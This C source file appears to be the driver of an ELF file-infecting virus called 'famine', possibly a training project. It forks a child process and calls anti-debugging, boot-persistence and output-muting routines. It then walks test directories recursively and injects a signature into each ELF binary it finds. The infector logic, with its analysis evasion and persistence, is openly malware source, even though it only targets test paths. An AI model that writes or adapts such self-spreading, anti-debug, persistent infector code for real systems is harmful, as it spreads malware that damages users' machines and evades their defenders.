#include "../include/famine.h"

void famine(char *fullpath) {
    FamineFile *file = elf_file_get(fullpath);
    if (file != NULL) {
        DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
        inject_signature(file);
        destroy_famine_file(file);
    } else {
        LOG(L_ERROR, "Failed to load ELF file.\n");
    }
}

void list_recursive(const char *path) {
    struct dirent *entry;
    char fullpath[PATH_MAX];
    struct stat st;

    DIR *dir = opendir(path);
    if (!dir) return;

    while ((entry = readdir(dir)) != NULL) {
        if (!ft_strcmp(entry->d_name, ".") || !ft_strcmp(entry->d_name, "..")) {
            continue;
        }

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        if (lstat(fullpath, &st) == -1 || S_ISLNK(st.st_mode)) {
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            list_recursive(fullpath);
        } else {
            famine(fullpath);
        }
    }

    closedir(dir);
}

int main(void) {
    set_log_level(L_DEBUG);
    DBG("[FAMINE START]\n");
    anti_debug();
    
    pid_t pid = fork();

    if (pid == 0) {
        int lock_fd = lock_global();
        if (*get_log_level() == L_NONE) {
            mute_output();
        }
        setup_boot_start();
        exit_if_process_running();
        list_recursive(TMPTEST_PATH);
        list_recursive(TMPTEST2_PATH);
        close(lock_fd);
    }

    wait(NULL);
    return (0);
}
